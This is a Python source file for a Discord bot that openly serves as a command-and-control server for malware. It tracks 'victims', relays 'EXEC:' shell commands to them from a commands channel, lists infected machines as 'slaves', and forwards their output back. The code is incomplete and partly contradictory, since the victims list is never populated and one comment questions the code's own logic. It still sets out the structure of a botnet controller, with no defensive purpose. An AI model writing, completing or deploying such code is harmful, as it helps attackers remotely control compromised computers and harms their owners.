import discord
from discord.ext import commands
import asyncio
import json
import os

# Config
TOKEN = 'YOUR_BOT_TOKEN_HERE'  # Replace with your token
COMMAND_CHANNEL_ID = 1234567890123456789  # Your #commands channel ID
LOG_CHANNEL_ID = 9876543210987654321    # Your #logs channel ID

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

# Store active victims by their unique ID (e.g., hostname)
victims = {}

@bot.event
async def on_ready():
    print(f'{bot.user} is online, you sick fuck. Ready to own souls.')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    # Listen for commands in COMMAND_CHANNEL
    if message.channel.id == COMMAND_CHANNEL_ID:
        content = message.content.lower()
        victim_id = content.split()[0] if content.startswith('!cmd ') else None
        
        if victim_id and victim_id in victims:
            # Forward command to victim (via DM or webhook)
            cmd = ' '.join(content.split()[1:])
            await victims[victim_id]['channel'].send(f'EXEC: {cmd}')
            await message.reply(f'Command "{cmd}" sent to {victim_id}')
        elif content == '!list':
            victim_list = '\n'.join([f'{vid}: Online' for vid in victims])
            await message.reply(f'Victims:\n{victim_list}' if victim_list else 'No slaves yet.')
    
    # Handle victim responses in LOG_CHANNEL
    elif message.channel.id == LOG_CHANNEL_ID and message.author.bot == False:  # Wait, victims aren't bots
        # Parse victim ID from message embed or content
        if 'VICTIM_ID:' in message.content:
            vid = message.content.split('VICTIM_ID:')[1].split()[0]
            # Log or notify you
            await bot.get_channel(COMMAND_CHANNEL_ID).send(f'From {vid}: {message.content}')
    
    await bot.process_commands(message)

# DM handler for private commands
@bot.command()
async def cmd(ctx, *, command):
    if ctx.channel.type == discord.ChannelType.private:
        # Assume this is for a specific victim; extend as needed
        await ctx.send('Command queued. Check logs.')

bot.run(TOKEN)
